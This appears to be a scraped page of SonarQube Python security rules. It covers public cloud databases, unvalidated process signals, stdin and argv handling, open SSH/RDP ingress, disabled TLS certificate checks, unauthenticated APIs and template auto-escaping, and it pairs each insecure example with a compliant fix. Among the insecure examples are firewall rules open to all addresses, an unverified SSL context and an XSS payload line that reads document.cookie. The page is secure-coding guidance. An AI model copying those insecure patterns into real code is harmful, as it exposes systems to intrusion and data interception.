from aws_cdk import aws_ec2 as ec2

rds_subnet_group_public &#61; rds.CfnDBSubnetGroup(
    self,
    &#34;public_subnet&#34;,
    db_subnet_group_description&#61;&#34;Subnets&#34;,
    subnet_ids&#61;vpc.select_subnets(
        subnet_type&#61;ec2.SubnetType.PUBLIC
    ).subnet_ids
)

rds.CfnDBInstance(
    self,
    &#34;public-public-subnet&#34;,
    engine&#61;&#34;postgres&#34;,
    master_username&#61;&#34;foobar&#34;,
    master_user_password&#61;&#34;12345678&#34;,
    db_instance_class&#61;&#34;db.r5.large&#34;,
    allocated_storage&#61;&#34;200&#34;,
    iops&#61;1000,
    db_subnet_group_name&#61;rds_subnet_group_public.ref,
    publicly_accessible&#61;True, # Sensitive
    vpc_security_groups&#61;[sg.security_group_id]
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html" rel="nofollow">aws_cdk.aws_ec2.Instance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.Instance(
    self,
    &#34;vpc_subnet_private&#34;,
    instance_type&#61;nano_t2,
    machine_image&#61;ec2.MachineImage.latest_amazon_linux(),
    vpc&#61;vpc,
    vpc_subnets&#61;ec2.SubnetSelection(subnet_type&#61;ec2.SubnetType.PRIVATE_WITH_NAT)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html" rel="nofollow">aws_cdk.aws_ec2.CfnInstance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.CfnInstance(
    self,
    &#34;cfn_private&#34;,
    instance_type&#61;&#34;t2.micro&#34;,
    image_id&#61;&#34;ami-0ea0f26a6d50850c5&#34;,
    network_interfaces&#61;[
        ec2.CfnInstance.NetworkInterfaceProperty(
            device_index&#61;&#34;0&#34;,
            associate_public_ip_address&#61;False, # Compliant
            delete_on_termination&#61;True,
            subnet_id&#61;vpc.select_subnets(subnet_type&#61;ec2.SubnetType.PRIVATE_WITH_NAT).subnet_ids[0]
        )
    ]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html" rel="nofollow">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
from aws_cdk import aws_dms as dms

rep_instance &#61; dms.CfnReplicationInstance(
    self,
    &#34;explicit_private&#34;,
    replication_instance_class&#61;&#34;dms.t2.micro&#34;,
    allocated_storage&#61;5,
    publicly_accessible&#61;False,
    replication_subnet_group_identifier&#61;subnet_group.replication_subnet_group_identifier,
    vpc_security_group_ids&#61;[vpc.vpc_default_security_group]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html" rel="nofollow">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import aws_rds as rds
from aws_cdk import aws_ec2 as ec2

rds_subnet_group_private &#61; rds.CfnDBSubnetGroup(
    self,
    &#34;private_subnet&#34;,
    db_subnet_group_description&#61;&#34;Subnets&#34;,
    subnet_ids&#61;vpc.select_subnets(
        subnet_type&#61;ec2.SubnetType.PRIVATE_WITH_NAT
    ).subnet_ids
)

rds.CfnDBInstance(
    self,
    &#34;private-private-subnet&#34;,
    engine&#61;&#34;postgres&#34;,
    master_username&#61;&#34;foobar&#34;,
    master_user_password&#61;&#34;12345678&#34;,
    db_instance_class&#61;&#34;db.r5.large&#34;,
    allocated_storage&#61;&#34;200&#34;,
    iops&#61;1000,
    db_subnet_group_name&#61;rds_subnet_group_private.ref,
    publicly_accessible&#61;False,
    vpc_security_groups&#61;[sg.security_group_id]
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4828">
              python:S4828
            </a>
          </td>
          <td>
            <details>
              <p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>
<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these
parameters may result in a denial of service.</p>
<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect
multiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li><li> This function is triggered by non-administrators. </li><li> Signal handlers on the target processes stop important functions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For stateful applications with user management, ensure that only administrators trigger this code. </li><li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li><li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li><li> Isolate the process on the system based on its (E)UID. </li><li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import os

&#64;app.route(&#34;/kill-pid/&lt;pid&gt;&#34;)
def send_signal(pid):
    os.kill(pid, 9)  # Sensitive

&#64;app.route(&#34;/kill-pgid/&lt;pgid&gt;&#34;)
def send_signal(pgid):
    os.killpg(pgid, 9)  # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import os

&#64;app.route(&#34;/kill-pid/&lt;pid&gt;&#34;)
def send_signal(pid):
    # Validate the untrusted PID,
    # With a pre-approved list or authorization checks
    if is_valid_pid(pid):
        os.kill(pid, 9)

&#64;app.route(&#34;/kill-pgid/&lt;pgid&gt;&#34;)
def send_signal(pgid):
    # Validate the untrusted PGID,
    # With a pre-approved list or authorization checks
    if is_valid_pgid(pgid):
        os.kill(pgid, 9)
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/283" rel="nofollow">MITRE, CWE-283</a> - Unverified Ownership </li><li> <a href="https://man7.org/linux/man-pages/man1/kill.1.html" rel="nofollow">kill(1) — Linux manual page</a> </li><li> <a href="https://man7.org/linux/man-pages/man2/kill.2.html" rel="nofollow">kill(2) — Linux manual page</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4829">
              python:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<p>Python 2 and Python 3</p>
<pre>
import sys
from sys import stdin, __stdin__

# Any reference to sys.stdin or sys.__stdin__ without a method call is Sensitive
sys.stdin  # Sensitive

for line in sys.stdin:  # Sensitive
    print(line)

it &#61; iter(sys.stdin)  # Sensitive
line &#61; next(it)

# Calling the following methods on stdin or __stdin__ is sensitive
sys.stdin.read()  # Sensitive
sys.stdin.readline()  # Sensitive
sys.stdin.readlines()  # Sensitive

# Calling other methods on stdin or __stdin__ does not require a review, thus it is not Sensitive
sys.stdin.seekable()  # Ok
# ...
</pre>
<p>Python 2 only</p>
<pre>
raw_input(&#39;What is your password?&#39;)  # Sensitive
</pre>
<p>Python 3 only</p>
<pre>
input(&#39;What is your password?&#39;)  # Sensitive
</pre>
<p>Function <code>fileinput.input</code> and class <code>fileinput.FileInput</code> read the standard input when the list of files is empty.</p>
<pre>
for line in fileinput.input():  # Sensitive
    print(line)

for line in fileinput.FileInput():  # Sensitive
    print(line)

for line in fileinput.input([&#39;setup.py&#39;]):  # Ok
    print(line)

for line in fileinput.FileInput([&#39;setup.py&#39;]):  # Ok
    print(line)
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4823">
              python:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue on every reference to <code>sys.argv</code>, call to <code>optparse.OptionParser()</code> or a call to
<code>argparse.ArgumentParser()</code>. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6321">
              python:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html" rel="nofollow">aws_cdk.aws_ec2.Instance</a> and other constructs that
support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

instance &#61; ec2.Instance(
    self,
    &#34;my_instance&#34;,
    instance_type&#61;nano_t2,
    machine_image&#61;ec2.MachineImage.latest_amazon_linux(),
    vpc&#61;vpc
)

instance.connections.allow_from(
    ec2.Peer.any_ipv4(), # Noncompliant
    ec2.Port.tcp(22),
    description&#61;&#34;Allows SSH from all IPv4&#34;
)
instance.connections.allow_from_any_ipv4( # Noncompliant
    ec2.Port.tcp(3389),
    description&#61;&#34;Allows Terminal Server from all IPv4&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2
security_group &#61; ec2.SecurityGroup(
    self,
    &#34;custom-security-group&#34;,
    vpc&#61;vpc
)

security_group.add_ingress_rule(
    ec2.Peer.any_ipv4(), # Noncompliant
    ec2.Port.tcp_range(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroup(
    self,
    &#34;cfn-based-security-group&#34;,
    group_description&#61;&#34;cfn based security group&#34;,
    group_name&#61;&#34;cfn-based-security-group&#34;,
    vpc_id&#61;vpc.vpc_id,
    security_group_ingress&#61;[
        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant
            ip_protocol&#61;&#34;6&#34;,
            cidr_ip&#61;&#34;0.0.0.0/0&#34;,
            from_port&#61;22,
            to_port&#61;22
        ),
        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant
            ip_protocol&#61;&#34;tcp&#34;,
            cidr_ip&#61;&#34;0.0.0.0/0&#34;,
            from_port&#61;3389,
            to_port&#61;3389
        ),
        { # Noncompliant
            &#34;ipProtocol&#34;:&#34;-1&#34;,
            &#34;cidrIpv6&#34;:&#34;::/0&#34;
        }
    ]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html" rel="nofollow">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroupIngress( # Noncompliant
    self,
    &#34;ingress-all-ip-tcp-ssh&#34;,
    ip_protocol&#61;&#34;tcp&#34;,
    cidr_ip&#61;&#34;0.0.0.0/0&#34;,
    from_port&#61;22,
    to_port&#61;22,
    group_id&#61;security_group.attr_group_id
)

ec2.CfnSecurityGroupIngress( # Noncompliant
    self,
    &#34;ingress-all-ipv6-all-tcp&#34;,
    ip_protocol&#61;&#34;-1&#34;,
    cidr_ipv6&#61;&#34;::/0&#34;,
    group_id&#61;security_group.attr_group_id
)
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html" rel="nofollow">aws_cdk.aws_ec2.Instance</a> and other constructs that
support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

instance &#61; ec2.Instance(
    self,
    &#34;my_instance&#34;,
    instance_type&#61;nano_t2,
    machine_image&#61;ec2.MachineImage.latest_amazon_linux(),
    vpc&#61;vpc
)

instance.connections.allow_from_any_ipv4(
    ec2.Port.tcp(1234),
    description&#61;&#34;Allows 1234 from all IPv4&#34;
)

instance.connections.allow_from(
    ec2.Peer.ipv4(&#34;192.0.2.0/24&#34;),
    ec2.Port.tcp(22),
    description&#61;&#34;Allows SSH from all IPv4&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2
security_group &#61; ec2.SecurityGroup(
    self,
    &#34;custom-security-group&#34;,
    vpc&#61;vpc
)

security_group.add_ingress_rule(
    ec2.Peer.any_ipv4(),
    ec2.Port.tcp_range(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroup(
    self,
    &#34;cfn-based-security-group&#34;,
    group_description&#61;&#34;cfn based security group&#34;,
    group_name&#61;&#34;cfn-based-security-group&#34;,
    vpc_id&#61;vpc.vpc_id,
    security_group_ingress&#61;[
        ec2.CfnSecurityGroup.IngressProperty(
            ip_protocol&#61;&#34;tcp&#34;,
            cidr_ip&#61;&#34;0.0.0.0/0&#34;,
            from_port&#61;1024,
            to_port&#61;1048
        ),
        {
            &#34;ipProtocol&#34;:&#34;6&#34;,
            &#34;cidrIp&#34;:&#34;192.0.2.0/24&#34;,
            &#34;fromPort&#34;:22,
            &#34;toPort&#34;:22
        }
    ]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html" rel="nofollow">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroupIngress(
    self,
    &#34;ingress-all-ipv4-tcp-http&#34;,
    ip_protocol&#61;&#34;6&#34;,
    cidr_ip&#61;&#34;0.0.0.0/0&#34;,
    from_port&#61;80,
    to_port&#61;80,
    group_id&#61;security_group.attr_group_id
)

ec2.CfnSecurityGroupIngress(
    self,
    &#34;ingress-range-tcp-rdp&#34;,
    ip_protocol&#61;&#34;tcp&#34;,
    cidr_ip&#61;&#34;192.0.2.0/24&#34;,
    from_port&#61;3389,
    to_port&#61;3389,
    group_id&#61;security_group.attr_group_id
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4830">
              python:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> is used. It is recommended to use
<code>_create_default_https_context</code> instead to create a secure context that validates certificates.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import ssl

ctx1 &#61; ssl._create_unverified_context() # Noncompliant
ctx2 &#61; ssl._create_stdlib_context() # Noncompliant

ctx3 &#61; ssl.create_default_context()
ctx3.verify_mode &#61; ssl.CERT_NONE # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import ssl

ctx &#61; ssl.create_default_context()
ctx.verify_mode &#61; ssl.CERT_REQUIRED

# By default, certificate validation is enabled
ctx &#61; ssl._create_default_https_context()
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6333">
              python:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br /> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The underlying API exposes all of its contents to any anonymous Internet user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul><li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li><li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li><li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html" rel="nofollow">aws_cdk.aws_apigateway.Resource</a>:</p>
<pre>
from aws_cdk import (
    aws_apigateway as apigateway
)

resource &#61; api.root.add_resource(&#34;example&#34;)
resource.add_method(
    &#34;GET&#34;,
    authorization_type&#61;apigateway.AuthorizationType.NONE  # Sensitive
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
from aws_cdk import (
    aws_apigatewayv2 as apigateway
)

apigateway.CfnRoute(
    self,
    &#34;no-auth&#34;,
    api_id&#61;api.ref,
    route_key&#61;&#34;GET /test&#34;,
    authorization_type&#61;&#34;NONE&#34;  # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html" rel="nofollow">aws_cdk.aws_apigateway.Resource</a>:</p>
<pre>
from aws_cdk import (
    aws_apigateway as apigateway
)

opts &#61; apigateway.MethodOptions(
    authorization_type&#61;apigateway.AuthorizationType.IAM
)
resource &#61; api.root.add_resource(
    &#34;example&#34;,
    default_method_options&#61;opts
)
resource.add_method(
    &#34;POST&#34;,
    authorization_type&#61;apigateway.AuthorizationType.IAM
)
resource.add_method(  # authorization_type is inherited from the Resource&#39;s configured default_method_options
    &#34;POST&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
from aws_cdk import (
    aws_apigatewayv2 as apigateway
)

apigateway.CfnRoute(
    self,
    &#34;auth&#34;,
    api_id&#61;api.ref,
    route_key&#61;&#34;GET /test&#34;,
    authorization_type&#61;&#34;AWS_IAM&#34;
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html" rel="nofollow">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5247">
              python:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy&#39;s template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a href="https://twig.symfony.com/doc/3.x/filters/escape.html" rel="nofollow">the strategy applied</a> and the context, for example a &#34;html auto-escaping&#34; strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity" rel="nofollow">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute" rel="nofollow">html attribute</a> because &#39;<code>:</code>&#39; character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href&#61;&#34;{<!-- -->{ myLink }}&#34;&gt;link&lt;/a&gt; // myLink &#61; javascript:alert(document.cookie)
&lt;a href&#61;&#34;javascript:alert(document.cookie)&#34;&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> Templates are used to render web content and
